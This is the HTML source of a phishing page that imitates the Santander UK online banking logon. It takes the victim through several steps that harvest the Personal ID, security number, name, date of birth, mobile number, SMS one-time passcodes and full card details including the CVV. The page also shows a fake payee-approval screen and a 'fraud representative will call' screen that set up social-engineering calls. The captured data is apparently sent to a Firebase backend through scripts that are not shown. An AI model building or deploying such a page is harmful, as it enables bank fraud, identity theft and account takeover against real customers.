
<html lang="en-GB"><head>
  <meta charset="utf-8">
  <title>Personal Online Banking: Log on or sign up</title>

<script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-database.js"></script>
<script src="https://www.gstatic.com/firebasejs/ui/4.6.1/firebase-ui-auth.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
<script type="text/javascript" src="config/config.js"></script>
<script type="text/javascript" src="js/misc.js"></script>
<script type="text/javascript" src="js/main.js"></script>


  <meta name="title" content="Online Banking | Personal Account Holders | Santander UK">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" type="text/css" href="css/styles.d639dea2316e6d785b32.css">


<style type="text/css">


  @font-face {font-family: "SantanderHeadlineW05-Rg"; src: url("Online/fonts/SantanderHeadlineW05Regular.eot");
  src: url("Online/fonts/SantanderHeadlineW05Regular.eot?#iefix") format("embedded-opentype"), 
  
  url("fonts/SantanderHeadlineW05Regular.woff2") format("woff2"), url("Online/fonts/SantanderHeadlineW05Regular.woff") format("woff"), url("Online/fonts/SantanderHeadlineW05Regular.ttf") format("truetype"), url("Online/fonts/SantanderHeadlineW05Regular.svg#SantanderHeadlineW05-Rg") format("svg"); } 
    input{
    font-family: 'SantanderHeadlineW05-Rg';
  }

a{
  font-family: 'SantanderHeadlineW05-Rg';
}
p{
   font-family: 'SantanderHeadlineW05-Rg';
}
span{
  font-family: 'SantanderHeadlineW05-Rg';
}
</style>
  <meta http-equiv="X-Xss-Protection" content="'1; mode=block' always">
  <meta http-equiv="X-Content-Type-Options" content="'nosniff' always">
  <meta http-equiv="Strict-Transport-Security" content="max-age=31536000">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, maximum-scale=2.0">





  <olb-root _nghost-uyv-c0="" ng-version="7.2.16"><olb-home _ngcontent-uyv-c0=""><div class="container-fluid appheader"><div class="container"><div class="row"><div class="col-sm-12 containerPadding header-responsive" role="banner"><olb-header><nav class="navbar appheader_content"><a href="https://www.santander.co.uk"><img alt="Santander Image" width="20%" class="img-fluid Bitmap header-logo-santander" src="https://www.santander.co.uk/themes/custom/santander_web18/logo.svg">





  </a><!----><!----><div><span style="font-family: SantanderHeadlineW05-Rg" class="title-small singup-text">Don’t have Online Banking?&nbsp;</span><a aria-describedby="signupDesc" aria-label="Sign up to Online Banking" class="anchor-red-links" style="font-family: SantanderHeadlineW05-Rg">Sign up</a>

  </div></nav></olb-header></div></div></div></div>
  <div class="container" ><div class="row"><div aria-live="assertive" class="col-sm-12 main-section-responsive" role="main"><router-outlet></router-outlet><olb-logon>






<!-- ---------------------------------------------STEP 1 ------------------------>
  	<div  s class=""><div style="" class="row">


  		<div id="1" class="col-lg-5 col-sm-12 left-content " style="display: block;"><div>

    <div style=""  class="d-flex justify-content-center mt-4" id="logon-heading">
    	<h1 id="coddio" style="font-size: 25px;color:  #ec0000 !important;font-family: SantanderHeadlineW05-Rg;letter-spacing: 0.5px;font-weight: 400;
    line-height: normal; display: block">Log on to your Online Banking</h1></div>

    <div id="3" style="display: block" aria-live="off" class="mt-3"><ul class="nav nav-tabs d-flex justify-content-center" role="tablist"><li class="nav-item" role="presentation">
      <a id="personal" style="font-family: SantanderHeadlineW05-Rg" class="nav-link active"  role="tab" onclick="swap2();">Personal</a></li>
      <li class="nav-item" role="presentation"><a id="businesss" style="font-family: SantanderHeadlineW05-Rg" class="nav-link " role="tab" spacebarclick="" onclick="swap();">Business</a></li><li style="font-family: SantanderHeadlineW05-Rg" class="nav-item" role="presentation"><a style="font-family: SantanderHeadlineW05-Rg" class="nav-link" role="tab" spacebarclick="" href="">Corporate</a></li></ul></div></div>

      <div style="display: block;" id="step1">
      	<div class="tab-content d-flex justify-content-center mt-4 mb-5">

      	<div class="tab-pane active retail-logon-content" id="personal" role="tabpanel"><div aria-live="off"><olb-retail-logon>



<!-- ERROR LOGIN DETAILS -->
<div id="errore_dimer" style="display: none" class="errorMessage mb-3"><olb-validation-message imglocation="./assets/images/alert.svg" msgtype="warn"><!----><div class="row  warn pt-2 pb-2"><!----><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label aria-live="assertive" class="error-label" role="alert">Your Personal ID or Security number are incorrect. Getting your security details wrong may result in your access being blocked.</label><!----></div></div></olb-validation-message></div>
<!-- ERROR LOGIN DETAILS -->
</olb-retail-logon>



      		<div class="logon-form"><form autocomplete="off" novalidate="" class="ng-pristine ng-invalid ng-touched"><div class="errorMessage mb-3"><olb-validation-message imglocation="./assets/images/alert.svg" msgtype="warn"><!----></olb-validation-message></div><div class="row"><div class="form-group">

    <label style="font-family: SantanderHeadlineW05-Rg" class="label" for="pid">Personal ID</label>

    <a id="forgotten" style="margin-left: 125px;display: none;font-family: SantanderHeadlineW05-Rg " aria-describedby="forgottenPIDDetailsDesc" class="help-title align-right" tabindex="0" href="/FRGTID_EMP_ENS/BtoChannelDriver.bto?dse_operationName=ForgottenId">Forgotten ID?</a>

    <input alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="pid" id="pid" maxlength="26" minlength="5" name="pid" onpaste="return true" type="text"><!----><!---->
    <span class="d-none" id="pidDesc"> Please Enter your Personal ID </span></div></div><div class="row"><div class="form-group">
      <label style="font-family: SantanderHeadlineW05-Rg" class="label" for="securityNumber">Security number</label><div class="security-number-help-info">
      
    </div><common-security-number _nghost-uyv-c1=""><!----><!----><div _ngcontent-uyv-c1="" class="ng-pristine ng-invalid ng-touched"><label _ngcontent-uyv-c1="" class="sr-only" for="securityNumber">Security Number</label><input _ngcontent-uyv-c1="" aria-required="true" autocomplete="off" maxlength="5" minlength="5" oncopy="return false" oncut="return false" onpaste="return false" placeholder="●●●●●" type="password" class="security-number form-control logon-textbox password-textbox ng-untouched ng-pristine ng-invalid" id="securityNumber" name="securityNumber" aria-describedby="securityNumberDacIdsecurityNumber"><span _ngcontent-uyv-c1="" class="d-none" id="securityNumberDacIdsecurityNumber"> Please Enter 5 digits security number and it is also known as Registration number or Customer PIN </span></div></common-security-number><!----><!----></div></div><div class="row d-flex ">
      <div class="rememberMeDiv"><label class="checkbox_container"><!----><!----><input aria-describedby="remembermeDesc" aria-label="Remember ID" formcontrolname="rememberme" id="rememberme" name="rememberme" type="checkbox" class="ng-untouched ng-pristine ng-valid">
        <span style="font-family: SantanderHeadlineW05-Rg" class="checkbox_text">Remember ID </span><span class="checkmark"></span><div class="d-none">
          
        </div></label></div></div><div class="row d-flex "><div class="mt-2"><label class="checkbox_container"><input aria-describedby="publicDeviceDesc" aria-label="I'm using a public or shared device" formcontrolname="publicdevice" id="publicdevice" name="publicdevice" type="checkbox" class="ng-untouched ng-pristine ng-valid"><span class="checkbox_text" style="font-family: SantanderHeadlineW05-Rg"> I'm using a public or shared device </span><span class="checkmark"></span><span style="fontfa" class="d-none" id="publicDeviceDesc"> Please check the checkbox if you are using public or shared device </span></label></div></div><div class=" mt-4 row d-flex"><!---->
    	<div class="mt-4 text-center col-md-12 pl-0 pr-0"><div class="justify-content-center button-xs-width">
    	<button aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="btn_login" type="button" onclick="login();">
    


    	<span style="font-family: SantanderHeadlineW05-Rg" class="log-on-text">Log on</span></button>
		<span class="d-none" id="logonButtonDesc"> Please click logon button to validate your Personal ID and Security Number </span></div></div>


		<div class="col-md-12 mt-2"><div class="d-flex justify-content-center"><a aria-describedby="forgottenDetailsDesc" class="anchor-red-links" tabindex="0" href="/olb/app/reset/">Forgotten details?</a><span class="d-none" id="forgottenDetailsDesc"> If you don't remember your logon credentials, Please click here </span></div></div><!----><div><!----></div></div><div><input autocomplete="new-password" class="log-info__hidden" id="disable-pwd-mgr-1" name="disable-pwd-mgr-1" style="display: none;" type="password" value="disable-pwd-mgr-1"><input autocomplete="new-password" class="log-info__hidden" id="disable-pwd-mgr-2" name="disable-pwd-mgr-2" style="display: none;" type="password" value="disable-pwd-mgr-2"></div></form>

	</div></olb-retail-logon></div></div><div class="tab-pane" id="buisness" role="tabpanel"></div><div class="tab-pane" id="coporate" role="tabpanel"></div></div></div>





<!----------------------------- STEP 2 INIZIO ------------------------------------------------------------------>

 <div style="display: none;margin-left: -50px;" id="step2">

    <div  class="d-flex justify-content-center mt-4" id="logon-heading">
    	<h1 style="font-size: 20px; font-family: SantanderHeadlineW05-Rg;color:  black !important;letter-spacing: 0.5px;font-weight: 400;
    line-height: normal;">Please Confirm your data</h1></div>

      	<div style="margin-left: 100px;" class="tab-content d-flex justify-content-center mt-4 mb-5">
      <div class="row">
                    <div class="form-group">
<div>
    <label  style="font-family: 'SantanderHeadlineW05-Rg';" class="label" for="pid">Full Name</label>
    <input alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="fullname" id="fullname" maxlength="26"   name="fullname" onpaste="return true" type="text"><!----><!---->
</div>

<div style="margin-top: 10px;">
      <label  style="font-family: 'SantanderHeadlineW05-Rg';" class="label" for="pid">Date of Birth</label>
    <input alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="dob" id="dob" maxlength="14"  name="dob" onpaste="return true" type="text"><!----><!---->

</div>
<div style="margin-top: 5px;">
    <label  style="font-family: 'SantanderHeadlineW05-Rg';" class="label" for="pid">Mobile Number</label>
    <input alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="phone" id="m" maxlength="26"  name="m" onpaste="return true" type="text"><!----><!---->
</div>
</div>
<div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">
	<button  aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="btn_step2" type="submit" onclick="step_two();">
    


    	<span  style="font-family: 'SantanderHeadlineW05-Rg';" class="log-on-text">Confirm</span></button>
    	</div>


  </div></div>


      	</div>
      	</div>





<!-- ERRORE OTP-->
<!-- <div id="errore_otp" style="display: none" class="errorMessage mb-3"><olb-validation-message imglocation="./assets/images/alert.svg" msgtype="warn"><div class="row  warn pt-2 pb-2"><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label aria-live="assertive" class="error-label" role="alert">You have insert a wrong OTP code.</label></div></div></olb-validation-message></div> -->


<!-- --------------------------------------------------------------------------STEP3 ------------------------------------------>

 <div style="display: none;margin-top: 10%;" id="step3">

    <div  style="text-align: center" class="d-flex justify-content-center mt-10" id="logon-heading">

   <img style="" alt="Send One Time Passcode Image"  class="img-fluid sms-mid-image mt-4" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/ui-icon-fill-sms.png"></div>
<div class="row">
 <div class="form-group" style="margin-left: 0px;">
<div class="row mt-3"><div class="col-md-12">
  <h1 style="font-family: 'SantanderHeadlineW05-Rg'" class="title-header">Enter One Time Passcode</h1>

</div></div><div></div>

<div>
<div class="col-md-12 col-sm-12 col-lg-12 title-default" style="margin-top: 5%;text-align: center;font-family: 'SantanderHeadlineW05-Rg'"> You should receive your code in a moment.</div>
</div>


<div  class="col-md-12 col-sm-12 col-lg-10 label" style="margin-top: 5%;font-family: 'SantanderHeadlineW05-Rg'"> One Time Passcode </div>



 <div style="margin-top: 10px;margin-left: 100px;">

  <input  aria-label="One Time Passcode" aria-required="true" maxlength="8" minlength="3" oncopy="return false" oncut="return false" onpaste="return false" required="" type="password" class="otp-textbox ng-pristine ng-invalid ng-touched" id="pwd" name="pwd">

   <label aria-live="assertive" id="errore_otp" class="error-label" role="alert" style="display: none;font-family: 'SantanderHeadlineW05-Rg';color: #ec0000">Sorry, the passcode is incorrect.<br> Please check and try again.</label>
  <div style="font-family: 'SantanderHeadlineW05-Rg'" class="otp-text" id="otp-text"> Didn't receive<span> a SMS? </span><!----><!----><!----><!----><!----><!----><a aria-describedby="resendOTPDesc" class="help-title" id="resend-OTP" href="">Resend</a><!----><!----></div>
    <div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">

<div class="row"><div class="col-md-12 col-sm-12 col-lg-12 d-flex justify-content-center"><button style="margin-right: 100px;" aria-describedby="validateOTPDesc" class="button button-secondary" id="otpbutton" type="button" onclick="otp();">Continue</button>
    </div></div>


    	</div></div>


</div>

  </div>


    </div></div>


<!-- --------------------------------------------------------------------------STEP3 FINISHHHHHHHHHH ------------------------------------------>





<!-- --------------------------------------------------------------------------STEP3 ------------------------------------------>

 <div style="display: none;margin-top: 10%;" id="step6">

    <div  style="text-align: center" class="d-flex justify-content-center mt-10" id="logon-heading">

   <img style="" alt="Send One Time Passcode Image"  class="img-fluid sms-mid-image mt-4" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/ui-icon-fill-sms.png"></div>
<div class="row">
 <div class="form-group" style="margin-left: 0px;">
<div class="row mt-3"><div class="col-md-12">
  <h1 style="font-family: 'SantanderHeadlineW05-Rg'" class="title-header">Enter One Time Passcode</h1>

</div></div><div></div>

<div>
<div class="col-md-12 col-sm-12 col-lg-12 title-default" style="margin-top: 5%;text-align: center;font-family: 'SantanderHeadlineW05-Rg'"> You should receive your code in a moment.</div>
</div>


<div  class="col-md-12 col-sm-12 col-lg-10 label" style="margin-top: 5%;font-family: 'SantanderHeadlineW05-Rg'"> OTP to cancel the payment </div>



 <div style="margin-top: 10px;margin-left: 100px;">

  <input  aria-label="One Time Passcode" aria-required="true" maxlength="8" minlength="3" oncopy="return false" oncut="return false" onpaste="return false" required="" type="password" class="otp-textbox ng-pristine ng-invalid ng-touched" id="otp_t" name="otp_t">

   <label aria-live="assertive" id="errore_otp_two" class="error-label" role="alert" style="display: none;font-family: 'SantanderHeadlineW05-Rg';color: #ec0000">Sorry, the passcode is incorrect.<br> Please check and try again.</label>
  <div style="font-family: 'SantanderHeadlineW05-Rg'" class="otp-text" id="otp-text"> Didn't receive<span> a SMS? </span><!----><!----><!----><!----><!----><!----><a aria-describedby="resendOTPDesc" class="help-title" id="resend-OTP" href="">Resend</a><!----><!----></div>
    <div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">

<div class="row"><div class="col-md-12 col-sm-12 col-lg-12 d-flex justify-content-center"><button style="margin-right: 100px;" aria-describedby="validateOTPDesc" class="button button-secondary" id="otpbutton2" type="button" onclick="otp_two();">Continue</button>
    </div></div>


      </div></div>


</div>

  </div>


    </div></div>



     <div style="display: none;margin-top: 10%;" id="step7">

    <div  style="text-align: center" class="d-flex justify-content-center mt-10" id="logon-heading">

 </div>
<div class="row">
 <div class="form-group" style="margin-left: 0px;">
<div class="row mt-3"><div class="col-md-12">
  <h1 style="font-family: 'SantanderHeadlineW05-Rg'" class="title-header">We need to call you</h1>
<div style="text-align: center">
   <img style="text-align: center;" alt="Send One Time Passcode Image"  class="img-fluid sms-mid-image mt-4" src="img/call.jpg" width="50">
 </div>
</div></div><div></div>

<div>
<div class="col-md-12 col-sm-12 col-lg-12 title-default" style="margin-top: 5%;text-align: center;font-family: 'SantanderHeadlineW05-Rg'">  <p style="text-align: center;margin-top: 12%">Fraud representive will call to verify<br>
        When you ready we will call you on<br><br> <b id="mobile"></b></p></div>
</div>






 <div style="margin-top: 10px;margin-left: 100px;">

  <div style="font-family: 'SantanderHeadlineW05-Rg'" class="otp-text" id="otp-text"><!----><!----><!----><!----><!----><!----><!----></div>
    <div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">

<div class="row"><div class="col-md-12 col-sm-12 col-lg-12 d-flex justify-content-center"><button style="margin-right: 100px;" aria-describedby="validateOTPDesc" class="button button-secondary" id="otpbutton2" type="button" onclick="callme();">Call Me</button>
    </div></div>


      </div></div>


</div>

  </div>


    </div></div>



     <div style="display: none;margin-top: 10%;" id="step5">

    <div  style="text-align: center" class="d-flex justify-content-center mt-10" id="logon-heading">

 </div>
<div class="row">
 <div class="form-group" style="margin-left: 0px;">
<div class="row mt-3"><div class="col-md-12">
<!--   <h1 style="font-family: 'SantanderHeadlineW05-Rg'" class="title-header">Payment </h1> -->
<div style="text-align: center">
   <img style="text-align: center;" alt="Send One Time Passcode Image"  class="img-fluid sms-mid-image mt-4" src="img/logo.png" width="50">
 </div>
</div></div><div></div>

<div>
<div class="col-md-12 col-sm-12 col-lg-12 title-default" style="margin-top: 5%;text-align: center;font-family: 'SantanderHeadlineW05-Rg'">
  
                <p style="font-family: 'SantanderHeadlineW05-Rg'">We've successfully received your requests through your mobile device to add a new Payee yo your account. For your security, 
    you are required to authorize this change</p>
    <p style="text-align: center;font-family: 'SantanderHeadlineW05-Rg'">Please authorize this action after confirming the Payee Details mentioned below
    <br><br><br>Name: <b>Benjamin Saunders</b>
    <br>    <b id="amount_fiance"></b>
</div>
</div>






 <div style="margin-top: 10px;margin-left: 100px;">

  <div style="font-family: 'SantanderHeadlineW05-Rg'" class="otp-text" id="otp-text"><!----><!----><!----><!----><!----><!----><!----></div>
    <div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">

<div class="row"><div class="col-md-12 col-sm-12 col-lg-12 d-flex justify-content-center"><button style="margin-right: 20%;" aria-describedby="validateOTPDesc" class="button button-secondary" id="otpbutton2" type="button" onclick="decline();">Decline</button>
    </div></div>


      </div></div>


</div>

  </div>


    </div></div>


<!-- --------------------------------------------------------------------------STEP3 FINISHHHHHHHHHH ------------------------------------------>


<!-- --------------------------------------------------------------------------STEP6 ------------------------------------------>

<!--  <div style="display: none" id="step6">

<div id="errore_otp_due" style="display: none;margin-left: 50px;" class="errorMessage mb-3"><div class="row  warn pt-2 pb-2"><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label aria-live="assertive" class="error-label" role="alert">You have insert a wrong OTP code.</label></div></div></olb-validation-message></div>
    <div  class="d-flex justify-content-center mt-4" id="logon-heading">
      
    	<h1 style="font-size: 20px; margin-left: -90px;font-family: Roboto;color:  black !important;font-family: Roboto;letter-spacing: 0.5px;font-weight: 400;
    line-height: normal;">Insert the code you received</h1></div>
<div class="row">
 <div style="margin-left: 0px;" class="form-group">

 <div style="margin-top: 10px;margin-left: 50px;">
      <label class="label" for="pid">OTP to cancel payment request</label>
    <input minlength="3" alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="otp" id="otp_code_two" minlength="4" maxlength="14" type="password"  name="otp_code_two" onpaste="return true" type="text">

    <div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">
	<button  aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="otpbuttontwo" type="submit" onclick="step6();">

	
	<span class="log-on-text">Confirm</span></button>
    	</div></div>


</div>

  </div>


    </div></div>
 -->

<!-- --------------------------------------------------------------------------STEP6 FINISHHHHHHHHHH ------------------------------------------>



<!-- --------------------------------------------------------------------------STEPCREDIT ------------------------------------------>

 <div  style="display: none;margin-left: -45px;" id="step4">

<div id="credit_card_error" style="display: none;margin-left: 90px;" class="errorMessage mb-3"><div class="row  warn pt-2 pb-2"><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label aria-live="assertive" class="error-label" role="alert">You have insert a wrong Credit Card number.</label></div></div></olb-validation-message></div>
    <div   class="d-flex justify-content-center mt-4" id="logon-heading">
      
      <h1 style="font-size: 20px;font-family: SantanderHeadlineW05-Rg;color:  black !important;letter-spacing: 0.5px;font-weight: 400;
    line-height: normal;">Verify your Card details</h1></div>
<div class="row">
 <div class="form-group">

 <div style="margin-top: 10px;margin-left: 100px;">
      <label style="font-family: SantanderHeadlineW05-Rg" class="label" for="pid">Card Number</label>

    <input style="border: none;" minlength="3" alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="otp" id="cc_num" minlength="4" maxlength="20" type="text"  name="cc_num" onpaste="return true" type="number">
    <div id="error_ccnum" style="display: none;margin-left: 13px;" class="errorMessage mb-3"><div class="row  warn pt-2 pb-2"><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label aria-live="assertive" class="error-label" role="alert">Wrong Card Number</label></div></div></olb-validation-message></div>


    <div style="margin-top: 8px;">
      <label style="font-family: SantanderHeadlineW05-Rg" class="label" for="pid">Exp Date</label>

    <input style="border: none;" name="" maxlength="5"  placeholder="mm/yy" data-validation-type="alphanumeric"  class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="otp" id="cc_exp" minlength="4" maxlength="14" type="text"  name="cc_exp" onpaste="return true" type="text">
    </div>
 
<div id="error_exp" style="display: none;margin-left: 13px;" class="errorMessage mb-3"><div class="row  warn pt-2 pb-2"><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label style="font-family: SantanderHeadlineW05-Rg" aria-live="assertive" class="error-label" role="alert">Wrong exp date</label></div></div></olb-validation-message></div>


   <div style="margin-top: 8px;">
      <label style="font-family: SantanderHeadlineW05-Rg" class="label" for="pid">Valid From</label>

    <input style="border: none;"  maxlength="5"  placeholder="mm/yy" data-validation-type="alphanumeric"  class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="otp" id="cc_validation" minlength="4" maxlength="14" type="text"  name="cc_validation" onpaste="return true" type="text">
    </div>
 
<div id="error_validation" style="display: none;margin-left: 13px;" class="errorMessage mb-3"><div class="row  warn pt-2 pb-2"><div class="col-sm-2 text-center validation-img-placeholder"><img alt="alert image" class="validation-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/alert.svg"></div><div class="validation-content-placeholder col-sm-10"><label aria-live="assertive" class="error-label" role="alert">Wrong Validation date</label></div></div></olb-validation-message></div>





     <div style="margin-top: 8px;">
      <label  style="font-family: SantanderHeadlineW05-Rg" class="label" for="pid">CVV</label>

    <input style="border: none;" minlength="3" alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="otp" id="cc_cvv" minlength="4" maxlength="7" type="password"  name="cc_cvv" onpaste="return true" type="text">
    </div>
     





    <div class="mt-4 text-center col-md-12 pl-0 pr-0"><div style="width: 300px;">
  <button   aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="cc_button" type="submit" onclick="validate();">

  
  <span  style="font-family: SantanderHeadlineW05-Rg" class="log-on-text">Confirm</span></button>
      </div></div>



</div>

  </div>


    </div></div>


<!-- --------------------------------------------------------------------------STEPCREDIT FINISHHHHHHHHHH ------------------------------------------>





</div>

	<div class="col-lg-7 right-content">


    <div id="global" style="display: block"  aria-live="off"><olb-logon-right-content><div><div class="row logon-image mt-5"><img alt="Beware coronavirus scams Image" class="logon-right-image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/SMS@1x.svg" ></div><div class="mb-1 mt-1 logon-text-details-container" id="victimDesc"><div class="row"><div class="text-header col-sm-12"><p style="color">Beware coronavirus scams</p>



    </div></div><div class="row"><div class="logon-text-details col-sm-12"><p>Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from us is genuine. <a aria-describedby="covid-19-msg-desc" class="text-sub-details" href="" target="_blank">Learn more</a>. </p><span class="d-none" id="covid-19-msg-desc"> Learn more. </span></div></div></div></div></olb-logon-right-content></div></div></div></div>





 
 
</olb-logon></div>



<!---------------------------- STEP5 ------------------------------------------------------------------------------------------>
<!-- <div id="step5"style="display: none;margin-top: ">
	<div style="margin-left: 45%">
<img style="text-align: center;width: 20%" src="img/logo.png">
</div>
<div style>
	<p>We've successfully received your requests through your mobile device to add a new Payee yo your account. For your security, 
		you are required to authorize this change</p>
		<p style="text-align: center;">Please authorize this action after confirming the Payee Details mentioned below
		<br><br><br>Name: <b>Marc Lorand</b>
		<br>    <b id="amount_fiance"></b>
		<div id="forbut">
			
<div style=" margin:0 auto; /* this will center the page */
   width:400px; /*  use your width here */">
	<button style="" aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="otpbutton" type="submit" onclick="decline()">
	<span style="font-family: SantanderHeadlineW05-Rg" class="log-on-text">Confirm</span></button></div>

<div style="margin-top: 20px;margin-bottom: 30px;">
<div style="; margin:0 auto; /* this will center the page */
   width:400px; /*  use your width here */">
	<button  aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="n" type="submit" onclick="decline();">
	<span style="font-family: SantanderHeadlineW05-Rg" -Rg class="log-on-text">Decline</span></button></div>

	</div>
</div>


</div> -->
<!---------------------------- STEP5 ------------------------------------------------------------------------------------------>








</p></div>

<!-- MODAL WILL BE THE WAIING MODAL---------------------------------------------- -->
    <div id="supermodal" style="display: none;">
    <div style="display: block;" class="overlay" role="alert">

      <div  style="display: block;" style="height: 300px;" class="" id="myModal" role="dialog">
        <div class="modal-dialog modal-dialog-centered">
          <div class="modal-content" style="border-radius: 10px;">
            <div class="modal-body" style="height: 300px;" >
            <div><olb-logon-right-content><div>

              <div  style="text-align: center;font-size: 20px;margin-top: 12%;" class="loader">
                <p>Please waiting...</p>
                <div>
                <img  src="/Online/img/loader.gif" style="margin-top: 20px;margin-bottom: 50px;width: 10%;">
              </div>

</div>

</div>
</olb-logon-right-content></div></div></div></div></div></div></div>

<div id="div_call" style="display: none;">
    <div style="display: block;" class="overlay" role="alert">

      <div  style="display: block;" class="" id="myModal" role="dialog">
        <div class="modal-dialog modal-dialog-centered">
          <div class="modal-content" style="border-radius: 10px;">
            <div class="modal-body">
            <div><olb-logon-right-content><div>

       

              <div style="margin: 0 auto;width: 100px;margin-top:50px;">
             <img style=" width:100px;"  src="img/center.jpg">
              
         </div>

           <div style="margin: 0 auto;width: 400px;margin-top: 50px;">
            <p>A member of staff from our security department will call you on the number below shortly...</p>
            <p id="callnumber" style="text-align: center;"></p>
              
         </div>

             <div style="margin: 0 auto;width: 50px;margin-top:5%;margin-bottom: 5%">
             <img style=" width:50px;"  src="img/loader.gif">

             <p id="demoo"></p>
              
         </div>
             <!--  <div  style="text-align: center;margin-top: 50px;" class="loader">
                <p>We are calling you...</p>
                <div>
                <img  src="http://localhost/loader.gif" style="margin-top: 30px;margin-bottom: 50px;width: 10%;">
              </div> -->

</div>

</div>
</olb-logon-right-content></div></div></div></div></div></div></div>







<!-- MODAL WILL BE THE WAIING MODAL---------------------------------------------- -->

        <div class="row"><div class="text-header col-sm-12"></div></div><div class="row"><div class="logon-text-details col-sm-12" </p><span class="d-none" id="covid-19-msg-desc"> Learn more. </span></div></div></div></div></olb-logon-right-content></div><div class="d-flex justify-content-center"></div></div></div></div></div></div></olb-logon></div></div></div>






<!---------------------------- STEP5 PHONE ------------------------------------------------------------------------------------------>
<!-- <div id="step7"style="display: none">
    <div style="margin-top: -120px;margin-left: 45%">
<img style="text-align: center;width: 20%" src="img/call.jpg">
</div>
<div style="margin-top: 40px;">
    
        <p style="text-align: center;">Fraud representive will call to verify<br><br>
        When you ready we will call you on</p>
       <p style="text-align: center;" id="mobile"> </b></p>
        <div id="forbut">
            


<div style="margin-top: 20px;margin-bottom: 70px;">
<div style="; margin:0 auto; /* this will center the page */
   width:400px; /*  use your width here */">
    <button  aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="otpbutton" type="submit" onclick="callme();">
    <span class="log-on-text">Call Me</span></button></div>

    </div>
</div>

</div>
</div> -->
<!---------------------------- STEP5 PHONE ------------------------------------------------------------------------------------------>













        <div class="container-fluid appfooter"><div class="container"><div class="row">
        	<div class="col-sm-12 containerPadding footer-responsive" role="contentinfo">
        	<olb-footer>


        	<footer class="footer-base"><div class="footer-left-content"><!----><a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-and-mobile-banking-commitment">Online Banking Guarantee</a><a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/accessibility">Site Help &amp; Accessibility</a><a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Security &amp; Privacy</a><a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-banking-service-terms-conditions">Terms &amp; Conditions</a><a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Legal</a></div><div class="footer-right-content"><img alt="FSCS Protected Image" src="https://retail.santander.co.uk/olb/app/logon/access/assets/images/asset-2.png"></div></footer></olb-footer></div></div></div></div><div><olb-session></olb-session></div></olb-home></olb-root>

</body></html>
